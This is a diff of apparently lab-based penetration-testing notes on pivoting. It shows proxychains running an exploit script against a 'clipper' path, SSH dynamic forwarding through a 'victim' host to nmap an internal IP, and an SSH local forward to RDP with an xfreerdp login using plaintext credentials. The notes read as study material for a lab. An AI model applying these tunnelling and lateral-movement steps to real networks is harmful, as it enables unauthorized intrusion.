@@ -92,15 +92,27 @@ root@attackdefense:~# proxychains python 38730.py http://192.181.168.3/clipper/ 
 _______________________________________________________________________________________________________________________________________________________________________________
 SSH tunneling with dynamic port forwarding ( Use proxychains with ssh to do port forwarding )
 -------------------------------------------
-ssh port is open in victim 1(192.163.141.3)
+ssh port is open in victim 1(10.129.65.82)
 
-#ssh root@192.163.141.3 -D 9050 (9050 port is in proxychains.conf)
+#ssh root@10.129.65.82 -D 9050 (9050 port is in proxychains.conf)
 
 If you don't have ssh connection in victim machine, you can't do ssh portforwarding.
 
 1. ssh connection in victim
-2. Open new tab > proxychains nmap -sT -sV 192.84.170.3 (We can scan internal IP port with proxychains)
+2. Open new tab > proxychains nmap -sT -sV 172.16.5.19 (We can scan internal IP port with proxychains)
 
-_________________________________________________________________________________________________________________________________________________________________________
+									(or)
+Tactic 2 
+---------
+
+172.16.5.19 (internal target)
+
+#ssh ubuntu@10.129.65.82 -L 2222:172.16.5.19:3389 (this SSH session needs to be opened )
+
+Connect with xfreerdp 
+
+#xfreerdp /v:127.0.0.1:2222 /u:victor /p:pass@123 /cert:ignore
+
+________________________________________________________________________________________________________________________________________________________________________
 
 
